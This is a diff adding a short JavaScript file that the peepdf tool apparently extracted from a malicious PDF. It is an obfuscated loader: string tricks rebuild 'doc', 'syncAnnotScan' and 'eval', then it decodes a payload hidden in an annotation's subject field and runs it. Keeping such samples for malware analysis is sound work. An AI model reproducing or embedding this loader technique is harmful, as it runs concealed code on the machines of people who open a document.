@@ -1,0 +1,21 @@
+// peepdf comment: Javascript code located in object 7 (version 0)
+
+var z;
+var y;
+var h = 'edvoazcl';
+z = y = app[h.replace(/[aviezjl]/g, '')];
+var tmp = 'syncAEEotScan';
+y = 0;
+z[tmp.replace(/E/g, 'n')]();
+y = z;
+var p = y.getAnnots({
+    nPage: 0
+});
+var s = p[0];
+s = s['sub' + 'ject'];
+var l = s.replace(/[zhyg]/g, '%');
+s = unescape(l);
+app[h.replace(/[czomdqs]/g, '')](s);
+s = '';
+z = 1;
+
